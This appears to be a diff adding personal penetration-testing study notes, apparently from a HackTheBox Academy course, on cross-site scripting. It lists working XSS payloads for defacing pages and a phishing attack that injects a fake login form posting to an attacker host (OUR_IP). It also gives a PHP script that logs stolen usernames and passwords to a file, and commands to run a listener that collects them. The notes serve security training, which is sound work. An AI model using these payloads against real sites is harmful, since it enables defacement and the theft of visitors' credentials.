@@ -211,3 +211,59 @@ Note: More efficient to write a python script that automates sending these paylo
 - Code Review
 !Note: We are unlikely to find any XSS vulnerabilities through payload lists or XSS tools for the more common web applications. This is because the developers of such web applications likely run their application through vulnerability assessment tools and then patch any identified vulnerabilities before release.
 Note: Reviewing the code from frontend to backend is the best way to detect XSS vulnerabilties.
+## XSS Attacks
+- Website Defacing
+Note: Defacing a website means changing its look for anyone who visits the website.
+How: Three HTML elements are usually utilized to change the main look of a web page:
+	Background Color document.body.style.background
+    	Background document.body.background
+    	Page Title document.title
+    	Page Text DOM.innerHTML
+-- Changing the Background
+Payload: <script>document.body.style.background = "#141d2b"</script> # Change website background to dark color.
+Payload: <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script> # Set an image as the background. 
+Payload: <script>document.title = 'HackTheBox Academy'</script> # Change the website title. 
+Payload: document.getElementById("todo").innerHTML = "New Text" # Changing the pages text.
+Payload: $("#todo").html('New Text'); #  Utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line.
+Note: To do so, the jQuery library must have been imported within the page source
+Payload: document.getElementsByTagName('body')[0].innerHTML = "Hacked" # Change the entire HTML code to only reveal "Hacked".
+Note: As we can see, we can specify the body element with document.getElementsByTagName('body'), and by specifying [0], we are selecting the first body element, which should change the entire text of the web page.
+Note: We may also use jQuery to achieve the same thing. 
+How?: Locally prepare html code to be used in our payload. Next minify the code to one line. 
+Final Payload: <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+## Phishing
+- Login Form Injection
+Note: To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.
+CODE: 
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+Note: To write HTML code to the vulnerable page, we use the JavaScript function document.write().
+Note: Minify the html code and add it to the write function.
+XSS Phishing Payload: document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+Note: We can see that the URL field is still displayed, which defeats our line of "Please login to continue".
+Note: To remove the field, find the ID in inspector/source and use the document.getElementById().remove() function to remove it.
+Code: document.getElementById('urlform').remove();
+New Payload: document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+- Credential Stealing
+Note: Send URL to the victim and start a nc listener on attack machine. 
+Note: This is great, but obvious to the victim that something is wrong. 
+Note: We can make the attack better by adding a php script.
+PHP Script:
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+Note: our index.php file ready, we can start a PHP listening server, which we can use instead of the basic netcat listener we used earlier.
+Command: mkdir /tmp/tmpserver
+Command: cd /tmp/tmpserver
+Command: nano index.php #at this step we wrote our index.php file
+Command: sudo php -S 0.0.0.0:80
